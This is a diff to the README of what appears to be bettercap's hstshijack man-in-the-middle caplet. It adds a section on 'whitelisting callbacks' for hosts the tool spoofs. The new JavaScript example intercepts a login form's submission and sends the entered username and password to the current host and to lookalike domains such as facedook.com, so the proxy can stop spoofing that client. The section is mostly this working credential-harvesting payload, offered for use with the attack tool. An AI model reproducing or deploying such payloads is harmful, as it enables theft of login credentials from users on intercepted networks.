@@ -94,6 +94,40 @@ The code above will send a POST request that will be sniffed by bettercap, but n
 
 As soon as bettercap receives a silent callback, any request for the targeted host will no longer be spoofed for that client.
 
+### Whitelisting callbacks
+
+You can stop attacking a client on a certain host when you receive a request from that client for the whitelist path. The whitelist path will be inserted wherever you have `obf_path_whitelist` written in your payloads (`/` will not be written).
+
+Example of whitelisting callbacks:
+
+```js
+// Whitelist multiple domains
+
+form.onsubmit = function() {
+  // Whitelist current hostname
+  req = new XMLHttpRequest()
+  req.open("POST", "http://" + location.hostname + "/obf_path_whitelist?username=" + username + "&password=" + password)
+  req.send()
+
+  // Whitelist facebook
+  req = new XMLHttpRequest()
+  req.open("POST", "http://facedook.com/obf_path_whitelist?username=" + username + "&password=" + password)
+  req.send()
+
+  // Whitelist facebook CDN
+  req = new XMLHttpRequest()
+  req.open("POST", "http://fdcdn.com/obf_path_whitelist?username=" + username + "&password=" + password)
+  req.send()
+
+  // Whitelist redirect to facebook
+  req = new XMLHttpRequest()
+  req.open("POST", "http://fd.com/obf_path_whitelist?username=" + username + "&password=" + password)
+  req.send()
+}
+```
+
+When the bettercap proxy receives such a request, it will stop attacking clients on that (original/spoofed) host. If a spoofed location is requested that was whitelisted, the client will then be redirected to the intended location.
+
 ### Block scripts
 
 In the <a href="./hstshijack.cap">**caplet file**</a> you can block JavaScript on hosts by assigning them to the `hstshijack.blockscripts` variable. _(wildcard allowed)_ 
